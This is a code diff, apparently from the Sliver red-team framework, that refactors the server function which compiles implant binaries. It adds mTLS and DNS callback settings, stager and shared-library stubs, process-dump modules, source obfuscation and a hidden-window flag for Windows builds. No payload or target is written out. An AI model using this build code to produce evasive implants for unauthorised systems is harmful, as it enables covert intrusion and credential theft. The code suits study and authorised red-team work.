@@ -9,6 +9,7 @@ import (
 	"log"
 	"os"
 	"path"
+	"path/filepath"
 	"sliver/server/assets"
 	"sliver/server/certs"
 	gobfuscate "sliver/server/gobfuscate"
@@ -36,15 +37,23 @@ const (
 
 // SliverConfig - Parameters when generating a implant
 type SliverConfig struct {
-	Name               string
-	CACert             string
-	Cert               string
-	Key                string
-	DefaultServer      string
-	DefaultServerLPort uint16
-	Debug              bool
-	ReconnectInterval  int
+	// Go
+	GOOS   string
+	GOARCH string
 
+	// Standard
+	Name              string
+	CACert            string
+	Cert              string
+	Key               string
+	Debug             bool
+	ReconnectInterval int
+
+	// mTLS
+	MTLSServer string
+	MTLSLPort  uint16
+
+	// DNS
 	DNSParent string
 }
 
@@ -62,25 +71,28 @@ func GetSliversDir() string {
 	return sliversDir
 }
 
-// ImplantBinary - Generates a binary - TODO: This should probably just accept a SliverConfig{}
-func ImplantBinary(goos string, goarch string, server string, lport uint16, dnsParent string, debug bool) (string, error) {
+// SliverEgg - Generates a sliver egg (stager) binary
+func SliverEgg(config SliverConfig) (string, error) {
 
-	goos = path.Base(goos)
-	goarch = path.Base(goarch)
-	target := fmt.Sprintf("%s/%s", goos, goarch)
+	return "", nil
+}
+
+// SliverSharedLibrary - Generates a sliver shared library (DLL/dylib/so) binary
+func SliverSharedLibrary(config SliverConfig) (string, error) {
+	return "", nil
+}
+
+// SliverExecutable - Generates a sliver executable binary
+func SliverExecutable(config SliverConfig) (string, error) {
+
+	target := fmt.Sprintf("%s/%s", config.GOOS, config.GOARCH)
 	if _, ok := gogo.ValidCompilerTargets[target]; !ok {
 		return "", fmt.Errorf("Invalid compiler target: %s", target)
 	}
 
-	config := SliverConfig{
-		DefaultServer:      server,
-		DefaultServerLPort: lport,
-		Debug:              debug,
-		ReconnectInterval:  30,
-		DNSParent:          dnsParent,
+	if config.Name == "" {
+		config.Name = GetCodename()
 	}
-
-	config.Name = GetCodename()
 	log.Printf("Generating new sliver binary '%s'", config.Name)
 
 	// Cert PEM encoded certificates
@@ -94,7 +106,7 @@ func ImplantBinary(goos string, goarch string, server string, lport uint16, dnsP
 	sliversDir := GetSliversDir() // ~/.sliver/slivers
 
 	// projectDir - ~/.sliver/slivers/<os>/<arch>/<name>/
-	projectGoPathDir := path.Join(sliversDir, goos, goarch, config.Name)
+	projectGoPathDir := path.Join(sliversDir, config.GOOS, config.GOARCH, config.Name)
 	os.MkdirAll(projectGoPathDir, os.ModePerm)
 
 	// binDir - ~/.sliver/slivers/<os>/<arch>/<name>/bin
@@ -112,28 +124,55 @@ func ImplantBinary(goos string, goarch string, server string, lport uint16, dnsP
 	sliverBox := packr.NewBox("../../sliver")
 
 	srcFiles := []string{
+
 		"crypto.go",
 		"handlers.go",
 		"handlers_windows.go",
 		"handlers_linux.go",
 		"handlers_darwin.go",
-		"ps.go",
-		"ps_windows.go",
-		"ps_linux.go",
-		"ps_darwin.go",
 		"tcp-mtls.go",
 		"udp-dns.go",
 		"sliver.go",
-		"dump.go",
-		"dump_windows.go",
-		"dump_linux.go",
-		"dump_darwin.go",
+
+		"limits/limits.go",
+		"limits/limits_windows.go",
+		"limits/limits_darwin.go",
+		"limits/limits_linux.go",
+
+		"ps/ps.go",
+		"ps/ps_windows.go",
+		"ps/ps_linux.go",
+		"ps/ps_darwin.go",
+
+		"procdump/dump.go",
+		"procdump/dump_windows.go",
+		"procdump/dump_linux.go",
+		"procdump/dump_darwin.go",
 	}
-	for _, fileName := range srcFiles {
-		sliverGoCode, _ := sliverBox.FindString(fileName)
-		sliverCodePath := path.Join(sliverPkgDir, fileName)
+	for _, boxName := range srcFiles {
+		sliverGoCode, _ := sliverBox.FindString(boxName)
+
+		// We need to correct for the "sliver/sliver/foo" imports, since Go
+		// doesn't allow relative imports and "sliver" is a subdirectory of
+		// the main "sliver" repo we need to fake this when coping the code
+		// to our per-compile "GOPATH"
+		var sliverCodePath string
+		dirName := filepath.Dir(boxName)
+		fileName := filepath.Base(boxName)
+		if dirName != "." {
+			// Add an extra "sliver" dir
+			dirPath := path.Join(sliverPkgDir, "sliver", dirName)
+			if _, err := os.Stat(dirPath); os.IsNotExist(err) {
+				log.Printf("[mkdir] %#v", dirPath)
+				os.MkdirAll(dirPath, os.ModePerm)
+			}
+			sliverCodePath = path.Join(dirPath, fileName)
+		} else {
+			sliverCodePath = path.Join(sliverPkgDir, fileName)
+		}
+
 		fSliver, _ := os.Create(sliverCodePath)
-		log.Printf("Rendering sliver code to: %s", sliverCodePath)
+		log.Printf("[render] %s", sliverCodePath)
 		sliverCodeTmpl, _ := template.New("sliver").Parse(sliverGoCode)
 		err := sliverCodeTmpl.Execute(fSliver, config)
 		if err != nil {
@@ -145,13 +184,13 @@ func ImplantBinary(goos string, goarch string, server string, lport uint16, dnsP
 	// Compile go code
 	appDir := assets.GetRootAppDir()
 	goConfig := gogo.GoConfig{
-		GOOS:   goos,
-		GOARCH: goarch,
+		GOOS:   config.GOOS,
+		GOARCH: config.GOARCH,
 		GOROOT: gogo.GetGoRootDir(appDir),
 		GOPATH: projectGoPathDir,
 	}
 
-	if !debug {
+	if !config.Debug {
 		log.Printf("Obfuscating source code ...")
 		obfuscatedGoPath := path.Join(projectGoPathDir, "obfuscated")
 		obfuscatedPkg, err := gobfuscate.Gobfuscate(goConfig, randomObfuscationKey(), "sliver", obfuscatedGoPath)
@@ -171,7 +210,7 @@ func ImplantBinary(goos string, goarch string, server string, lport uint16, dnsP
 	}
 	tags := []string{"netgo"}
 	ldflags := []string{"-s -w"}
-	if !debug && goConfig.GOOS == "windows" {
+	if !config.Debug && goConfig.GOOS == "windows" {
 		ldflags[0] += " -H=windowsgui"
 	}
 	_, err := gogo.GoBuild(goConfig, sliverPkgDir, dest, tags, ldflags)
